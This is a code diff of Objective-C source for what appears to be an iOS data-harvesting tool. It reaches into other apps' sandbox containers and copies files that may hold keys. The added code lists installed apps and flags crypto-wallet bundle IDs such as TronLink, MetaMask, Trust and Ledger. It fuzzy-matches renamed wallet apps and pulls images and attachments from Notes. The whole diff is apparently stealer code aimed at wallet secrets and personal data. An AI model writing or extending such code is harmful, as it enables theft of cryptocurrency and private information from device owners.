@@ -4,6 +4,7 @@
 #import "OWMCMLease.h"
 #import "OWLaunchServices.h"
 #include <dlfcn.h>
+#include <ctype.h>
 #import <objc/message.h>
 #include <sqlite3.h>
 
@@ -25,7 +26,7 @@ static NSSet<NSString *> *OWSkipBundleIds(void) {
 
 /// 单遍遍历时要整棵子树跳过的目录（相对容器根的小写路径）。
 /// 这些目录只装缓存/日志/媒体，既不会有密钥，索引里也不需要。
-static BOOL OWIsHeavyRel(NSString *lower) {
+static BOOL OWIsHeavyRel(NSString *lower, BOOL includeMedia) {
     static NSArray<NSString *> *heavy;
     static dispatch_once_t once;
     dispatch_once(&once, ^{
@@ -35,6 +36,8 @@ static BOOL OWIsHeavyRel(NSString *lower) {
                   @"library/application support/com.apple.sharedfilelist/"];
     });
     for (NSString *h in heavy) {
+        // 备忘录要图片：Media 目录对 includeMedia=true 的目标不跳过
+        if (includeMedia && [h isEqualToString:@"media/"]) continue;
         if ([lower isEqualToString:[h substringToIndex:h.length - 1]]) return YES;
         if ([lower hasPrefix:h]) return YES;
     }
@@ -123,9 +126,12 @@ static NSArray<NSDictionary *> *OWTargets(void) {
 - (void)_collectAndIndex:(NSDictionary *)target
            containerPath:(NSString *)containerPath
                   outDir:(NSString *)outDir
-                    name:(NSString *)name;
+                    name:(NSString *)name
+            includeMedia:(BOOL)includeMedia;
 - (void)_restorePayloadsFromDir:(NSString *)dir;
 - (uint64_t)_sizeOf:(NSString *)path;
+- (nullable NSString *)_fuzzyBundleIdForName:(NSString *)name
+                                   installed:(NSDictionary<NSString *, NSString *> *)installed;
 @end
 
 @implementation OWContainerPass {
@@ -222,6 +228,29 @@ static NSArray<NSDictionary *> *OWTargets(void) {
     NSUInteger hitTargets = 0;
     OWLog(@"B: 目标 %lu 个（MHA 定向模式，不做枚举）", (unsigned long)targets.count);
 
+    // Discovery：LaunchServices 能读就读，拿到「已安装 App 的 bundleId 全量列表」。
+    // 用途一：目标变体都查不到时按名字模糊反查（本次 TronLink 就是这么漏的）；
+    // 用途二：把含钱包关键词的 bundleId 打进日志，方便后续校准 targets.plist。
+    NSDictionary<NSString *, NSString *> *installed = [OWLaunchServices shared].allMappings;
+    OWLog(@"B: Discovery 已安装 %lu 个 App（LS 状态: %@）",
+          (unsigned long)installed.count, [OWLaunchServices shared].status ?: @"?");
+    if (installed.count) {
+        NSArray *hints = @[@"wallet", @"tron", @"token", @"metamask", @"okx", @"okex",
+                           @"bitpie", @"trust", @"ledger", @"trezor", @"safepal",
+                           @"onekey", @"coinbase", @"exodus", @"blockchain", @"imtoken"];
+        NSMutableArray *hits = [NSMutableArray array];
+        for (NSString *b in installed) {
+            NSString *low = b.lowercaseString;
+            for (NSString *k in hints) {
+                if ([low containsString:k]) { [hits addObject:b]; break; }
+            }
+        }
+        if (hits.count) {
+            OWLog(@"B: Discovery 钱包类候选 %lu: %@", (unsigned long)hits.count,
+                  [hits componentsJoinedByString:@", "]);
+        }
+    }
+
     // MHA 路线只支持「一个 identifier 一次查询」，所以直接按 targets 定向。
     for (NSDictionary *t in targets) {
         NSString *name = t[@"name"] ?: t[@"bundleId"];
@@ -255,6 +284,21 @@ static NSArray<NSDictionary *> *OWTargets(void) {
             if (tmp && tmp.path.length) { c = tmp; hitBid = b; break; }
         }
         if (!c || !c.path.length) {
+            // 变体都没命中：用 Discovery 列表按名字模糊反查一次（TronLink 这类改名/变体包）
+            NSString *fuzzy = [self _fuzzyBundleIdForName:name installed:installed];
+            if (fuzzy.length && ![bids containsObject:fuzzy]) {
+                for (NSNumber *cn in @[@(OWMCMClassApplicationData), @(OWMCMClassAppGroup)]) {
+                    OWMCMContainer *tmp = [[OWMCM shared] containerOfClass:(OWMCMClass)cn.integerValue
+                                                                identifier:fuzzy error:nil];
+                    if (tmp && tmp.path.length) {
+                        c = tmp; hitBid = fuzzy;
+                        OWLog(@"B: %@ 变体未命中，Discovery 反查到 %@", name, fuzzy);
+                        break;
+                    }
+                }
+            }
+        }
+        if (!c || !c.path.length) {
             OWLog(@"B: %@ (%@) 未找到容器（变体 %lu 个）", name, bid, (unsigned long)bids.count);
             continue;
         }
@@ -283,7 +327,7 @@ static NSArray<NSDictionary *> *OWTargets(void) {
             OWLog(@"B: %@ lease 失败 (%@)", name, reason ?: @"?");
             continue;
         }
-        [self _collectTarget:t containerPath:c.path];
+        [self _collectTarget:t containerPath:c.path includeMedia:[t[@"includeMedia"] boolValue]];
         OWLog(@"B: %@ 完成（%.2fs）", name, -[tT timeIntervalSinceNow]);
         [[OWMCMLease shared] releasePath:c.path];
     }
@@ -367,7 +411,8 @@ static NSArray<NSDictionary *> *OWTargets(void) {
         }
         leaseOK++;
 
-        [self _collectTarget:target containerPath:c.path];
+        [self _collectTarget:target containerPath:c.path
+                includeMedia:[target[@"includeMedia"] boolValue]];
 
         // 采完立刻还，避免 lease 池满（目标包 active_leases=3）
         [[OWMCMLease shared] releasePath:c.path];
@@ -408,7 +453,8 @@ static NSArray<NSDictionary *> *OWTargets(void) {
         }
         found[bid] = c.path;
         NSDictionary *t = [self _targetForBundleId:bid];
-        if (t) [self _collectTarget:t containerPath:c.path];
+        if (t) [self _collectTarget:t containerPath:c.path
+                       includeMedia:[t[@"includeMedia"] boolValue]];
         [[OWMCMLease shared] releasePath:c.path];
     }
 }
@@ -438,7 +484,8 @@ static NSArray<NSDictionary *> *OWTargets(void) {
 
     NSDictionary *t = [self _targetForBundleId:bundleId]
         ?: @{@"name": bundleId, @"bundleId": bundleId, @"mode": @"scan"};
-    [self _collectTarget:t containerPath:c.path];
+    [self _collectTarget:t containerPath:c.path
+            includeMedia:[t[@"includeMedia"] boolValue]];
 
     [[OWMCMLease shared] releasePath:c.path];
     return YES;
@@ -453,13 +500,16 @@ static NSArray<NSDictionary *> *OWTargets(void) {
     return nil;
 }
 
-- (void)_collectTarget:(NSDictionary *)target containerPath:(NSString *)containerPath {
+- (void)_collectTarget:(NSDictionary *)target
+         containerPath:(NSString *)containerPath
+          includeMedia:(BOOL)includeMedia {
     NSString *name = target[@"name"] ?: target[@"bundleId"];
     NSString *mode = target[@"mode"] ?: @"files";
     NSString *outDir = [self.workDir stringByAppendingPathComponent:name];
     [[NSFileManager defaultManager] createDirectoryAtPath:outDir
                               withIntermediateDirectories:YES attributes:nil error:nil];
-    OWLog(@"B: 采集 %@ (%@) mode=%@", name, target[@"bundleId"], mode);
+    OWLog(@"B: 采集 %@ (%@) mode=%@%@", name, target[@"bundleId"], mode,
+          includeMedia ? @" +media" : @"");
 
     if ([mode isEqualToString:@"whole_container"]) {
         [self _zipContainer:containerPath to:[outDir stringByAppendingPathComponent:@"container.zip"] name:name];
@@ -467,7 +517,8 @@ static NSArray<NSDictionary *> *OWTargets(void) {
     }
 
     // 单遍：定义件拷贝 + 兜底候选收集 + 文件索引，一次 enumerator 走完
-    [self _collectAndIndex:target containerPath:containerPath outDir:outDir name:name];
+    [self _collectAndIndex:target containerPath:containerPath outDir:outDir
+                      name:name includeMedia:includeMedia];
 
     [self _noteResultForName:name bundleId:target[@"bundleId"] dir:outDir containerPath:containerPath];
 }
@@ -480,7 +531,8 @@ static NSArray<NSDictionary *> *OWTargets(void) {
 - (void)_collectAndIndex:(NSDictionary *)target
            containerPath:(NSString *)containerPath
                   outDir:(NSString *)outDir
-                    name:(NSString *)name {
+                    name:(NSString *)name
+            includeMedia:(BOOL)includeMedia {
     NSArray *paths = target[@"paths"] ?: @[];
     NSArray *keywords = target[@"keywords"] ?: @[];
     NSArray *exts = target[@"exts"] ?: @[];
@@ -526,7 +578,8 @@ static NSArray<NSDictionary *> *OWTargets(void) {
         NSUInteger n = 0;
         uint64_t bytes = 0;
         [self _copyDefinedDir:src rel:drel outDir:outDir exts:exts keywords:keywords
-                     excludes:excludes indexPath:indexPaths copied:&n bytes:&bytes];
+                     excludes:excludes indexPath:indexPaths copied:&n bytes:&bytes
+                 includeMedia:includeMedia];
         foundFiles += n;
         definedBytes += bytes;
     }
@@ -540,7 +593,7 @@ static NSArray<NSDictionary *> *OWTargets(void) {
         OWLog(@"B: %@ 定义件不足，启用全容器兜底扫描", name);
         [self _fallbackScanContainer:containerPath outDir:outDir name:name
                                 exts:exts keywords:keywords excludes:excludes
-                           indexPath:indexPaths];
+                           indexPath:indexPaths includeMedia:includeMedia];
     }
 
     // ---- D) 文件索引：没走兜底时只记定义路径，不为索引白扫容器 ----
@@ -570,7 +623,8 @@ static NSArray<NSDictionary *> *OWTargets(void) {
                excludes:(NSArray<NSString *> *)excludes
               indexPath:(NSMutableArray<NSString *> *)indexPath
                  copied:(NSUInteger *)copied
-                  bytes:(uint64_t *)bytes {
+                  bytes:(uint64_t *)bytes
+           includeMedia:(BOOL)includeMedia {
     NSFileManager *fm = [NSFileManager defaultManager];
     NSMutableArray<NSString *> *useExts = [NSMutableArray array];
     for (NSString *e in exts) if (e.length) [useExts addObject:e.lowercaseString];
@@ -587,7 +641,7 @@ static NSArray<NSDictionary *> *OWTargets(void) {
     NSDirectoryEnumerator *en = [fm enumeratorAtPath:root];
     for (NSString *rel in en) {
         NSString *lower = rel.lowercaseString;
-        if (OWIsHeavyRel(lower)) { [en skipDescendants]; continue; }
+        if (OWIsHeavyRel(lower, includeMedia)) { [en skipDescendants]; continue; }
         BOOL skip = NO;
         for (NSString *ex in excludes) {
             if (ex.length && [lower containsString:ex.lowercaseString]) { skip = YES; break; }
@@ -608,9 +662,14 @@ static NSArray<NSDictionary *> *OWTargets(void) {
             NSDictionary *fa = [fm attributesOfItemAtPath:full error:nil];
             if (!fa || [fa[NSFileType] isEqualToString:NSFileTypeDirectory]) continue;
             uint64_t sz = [fa fileSize];
-            keep = subExt.length == 0 ||
-                   [lenientExts containsObject:subExt] ||
-                   (![media containsObject:subExt] && sz <= 2ULL * 1024 * 1024);
+            if (includeMedia && [media containsObject:subExt]) {
+                // 备忘录图片/附件：不受 2MB 宽松上限限制，交给 _copyItem 的总量上限兜底
+                keep = YES;
+            } else {
+                keep = subExt.length == 0 ||
+                       [lenientExts containsObject:subExt] ||
+                       (![media containsObject:subExt] && sz <= 2ULL * 1024 * 1024);
+            }
             if (!keep) continue;
         } else {
             BOOL isDir = NO;
@@ -638,7 +697,8 @@ static NSArray<NSDictionary *> *OWTargets(void) {
                           exts:(NSArray<NSString *> *)exts
                       keywords:(NSArray<NSString *> *)keywords
                       excludes:(NSArray<NSString *> *)excludes
-                     indexPath:(NSMutableArray<NSString *> *)indexPath {
+                      indexPath:(NSMutableArray<NSString *> *)indexPath
+                   includeMedia:(BOOL)includeMedia {
     NSFileManager *fm = [NSFileManager defaultManager];
     NSMutableArray<NSString *> *useExts = [NSMutableArray array];
     for (NSString *e in exts) if (e.length) [useExts addObject:e.lowercaseString];
@@ -670,11 +730,11 @@ static NSArray<NSDictionary *> *OWTargets(void) {
             if (ex.length && [lower containsString:ex.lowercaseString]) { skip = YES; break; }
         }
         if (skip) { [en skipDescendants]; continue; }
-        if (OWIsHeavyRel(lower)) { [en skipDescendants]; continue; }
+        if (OWIsHeavyRel(lower, includeMedia)) { [en skipDescendants]; continue; }
 
         if (indexPath.count < 6000) [indexPath addObject:rel];
         if (candidates.count >= 4000) continue;
-        if ([media containsObject:lower.pathExtension]) continue;
+        if (!includeMedia && [media containsObject:lower.pathExtension]) continue;
         if ([lower containsString:@"com.apple.mobile_container_manager.metadata.plist"]) continue;
 
         BOOL hit = [scanExts containsObject:lower.pathExtension];
@@ -712,6 +772,23 @@ static NSArray<NSDictionary *> *OWTargets(void) {
 
 - (uint64_t)_sizeOf:(NSString *)path {
     return [[[NSFileManager defaultManager] attributesOfItemAtPath:path error:nil] fileSize];
+}
+
+/// 目标变体全查不到时，用 Discovery 的已安装列表按名字模糊反查：
+/// "TronLink" → 匹配 bundleId 里含 "tronlink" 的那个（如 com.tronlink.wallet / com.tronlink.pro）。
+- (NSString * _Nullable)_fuzzyBundleIdForName:(NSString *)name
+                                     installed:(NSDictionary<NSString *, NSString *> *)installed {
+    if (!name.length || !installed.count) return nil;
+    NSMutableString *token = [NSMutableString string];
+    for (NSUInteger i = 0; i < name.length; i++) {
+        unichar ch = [name characterAtIndex:i];
+        if (isalnum(ch)) [token appendFormat:@"%C", (unichar)tolower(ch)];
+    }
+    if (token.length < 4) return nil;
+    for (NSString *bid in installed) {
+        if ([bid.lowercaseString containsString:token]) return bid;
+    }
+    return nil;
 }
 
 - (void)_restorePayloadsFromDir:(NSString *)dir {
